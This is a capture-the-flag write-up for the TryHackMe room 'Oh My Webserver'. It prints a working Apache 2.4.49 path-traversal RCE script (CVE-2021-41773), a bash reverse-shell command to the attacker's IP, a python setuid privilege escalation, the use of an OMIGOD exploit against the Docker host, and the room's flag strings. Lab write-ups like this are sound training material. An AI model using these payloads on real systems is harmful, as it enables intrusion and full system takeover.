# THM - Oh My Webserver

## Date Commenced 15MAR2022


---
## IP Address

### Attempt 1
export IP=10.10.58.80



---
## Rustscan Results
Open ports:

```
22, 80
```


---
## Nmap Results
Initial nmap scan:

> nmap -sC -sV -A 10.10.58.80 -p 22,80 | tee >> ./Results/nmap01.log

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 09:04 EDT
Nmap scan report for 10.10.58.80
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Consult - Business Consultancy Agency Template | Home
|_http-server-header: Apache/2.4.49 (Unix)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.41 seconds
```


---
## Web Page
Web page and source code doesnt reveal much for now.


---
## Gobuster
Intial gobuster scan for directories and some common files:

>sudo gobuster dir --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.58.80 -x epub,php,html,cgi,txt -t=250 2> /dev/null

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.58.80
[+] Method:                  GET
[+] Threads:                 250
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/15 09:55:16 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 234] [--> http://10.10.58.80/assets/]
===============================================================
2022/03/15 10:01:24 Finished
===============================================================
```



---
## Dirsearch
**Gobuster** didn't go so well, try **dirsearch**:

>dirsearch -u http://10.10.58.80 -e *

```

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                
 (_||| _) (/_(_|| (_| )                                                                                                                                         
                                                                                                                                                                
Extensions: gobusterdir02.log | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Output File: /home/kali/.dirsearch/reports/10.10.58.80/_22-03-15_10-16-55.txt

Error Log: /home/kali/.dirsearch/logs/errors-22-03-15_10-16-55.log

Target: http://10.10.58.80/

[10:16:56] Starting: 
[10:16:58] 403 -  199B  - /%2e%2e//google.com                              
[10:17:04] 403 -  199B  - /.ht_wsr.txt                                     
[10:17:04] 403 -  199B  - /.htaccess.save                                  
[10:17:04] 403 -  199B  - /.htaccess_extra
[10:17:04] 403 -  199B  - /.htaccess.sample
[10:17:04] 403 -  199B  - /.htaccess.orig
[10:17:04] 403 -  199B  - /.htaccess_sc
[10:17:04] 403 -  199B  - /.htaccessBAK
[10:17:04] 403 -  199B  - /.htaccessOLD2
[10:17:04] 403 -  199B  - /.htaccess.bak1
[10:17:04] 403 -  199B  - /.htaccessOLD
[10:17:04] 403 -  199B  - /.htpasswd_test                                  
[10:17:04] 403 -  199B  - /.htaccess_orig
[10:17:04] 403 -  199B  - /.htm
[10:17:04] 403 -  199B  - /.htpasswds
[10:17:04] 403 -  199B  - /.html
[10:17:04] 403 -  199B  - /.httr-oauth                                     
[10:17:38] 200 -  404B  - /assets/                                          
[10:17:38] 301 -  234B  - /assets  ->  http://10.10.58.80/assets/           
[10:17:42] 403 -  199B  - /cgi-bin/                                         
[10:17:43] 500 -  528B  - /cgi-bin/test-cgi                                 
[10:18:00] 200 -   57KB - /index.html                                       
                                                                             
Task Completed                                    
```


---
## Searchsploit
Found an exploit for Apache 2.4.49:

>Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE) | multiple/webapps/50383.sh

```
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami       
```


Run against the vulnerable server as a test:

> bash 50383.sh targets.txt /bin/sh "cat /etc/passwd"

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
```


Try to run with a reverse shell:

> bash 50383.sh targets.txt /bin/bash "bash -i >& /dev/tcp/10.9.1.154/4444 0>&1"

Success:
```
┌──(kali㉿kali)-[~/THM/Ohmywebserver]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.9.1.154] from (UNKNOWN) [10.10.58.80] 49768
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@4a70924bafa0:/bin$ pwd
pwd
/bin
daemon@4a70924bafa0:/bin$ whoami
whoami
daemon
daemon@4a70924bafa0:/bin$ 
```

This shell is slow. Tried to upgrade, but didnt go so well.


---
## Linux Enum
Found some interesting capabilties with **linpeas.sh**

```
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                      
Current capabilities:                                                                                                                                           
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+i
CapInh: 00000000a80425fb
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 00000000a80425fb
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/python3.7 = cap_setuid+ep

```

Using the method found here, I was able to privesc to *root*:

>https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

```
daemon@4a70924bafa0:/usr/bin$ getcap -r / 2> /dev/null
/usr/bin/python3.7 = cap_setuid+ep
daemon@4a70924bafa0:/usr/bin$ cd /usr/bin
daemon@4a70924bafa0:/usr/bin$ ls -al python3
lrwxrwxrwx 1 root root 9 Mar 26  2019 python3 -> python3.7
daemon@4a70924bafa0:/usr/bin$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@4a70924bafa0:/usr/bin# whoami
root
root@4a70924bafa0:/usr/bin# id
uid=0(root) gid=1(daemon) groups=1(daemon)
root@4a70924bafa0:/usr/bin# 
```

Found the **user.txt** but unable to locate the **root.txt** file yet:

```
root@4a70924bafa0:/usr/bin# find / -type f -iname user.txt 2> /dev/null
/root/user.txt
root@4a70924bafa0:/usr/bin# cat /root/user.txt
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
root@4a70924bafa0:/usr/bin# find / -type f -iname root.txt 2> /dev/null
root@4a70924bafa0:/usr/bin# 
```


---
## More Enums
Been going around in circles, but learnt something. how to get **nmap** (and other utilities) onto a docker image. Use static libraries:

> https://github.com/andrew-d/static-binaries

**git clone** the above repository and then upload the **nmap** onto the docker image.

From *linpeas.sh*, we can guess the IP address to target:

```
╔══════════╣ Interfaces
default         0.0.0.0                                                                                                                                         
loopback        127.0.0.0
link-local      169.254.0.0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 1513101  bytes 193691256 (184.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1956440  bytes 395383126 (377.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Which leads to:

```
root@4a70924bafa0:/tmp# ./nmap_ 172.17.0.1 -p 1-9999 --min-rate 1000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-03-15 15:16 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000033s latency).
Not shown: 9995 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:89:00:E1:45 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 30.49 seconds
```


---
## port 5986 WinRM
Found the following exploit:

> https://github.com/AlteredSecurity/CVE-2021-38647/blob/main/CVE-2021-38647.py

Uploaded to the remote machine and ran it against the host:

> python3 exploit.py -t 172.17.0.1 -c "cat /root/root.txt"

```
root@4a70924bafa0:/tmp# python3 exploit.py -t 172.17.0.1 -c "cat /root/root.txt
"
THM{7f147ef1f36da9ae29529890a1b6011f}

```


---
## What did I learn?

1. look outside the Docker
2. How to get nmap (and other utilities) as binaries
3. Hmmmm...
 










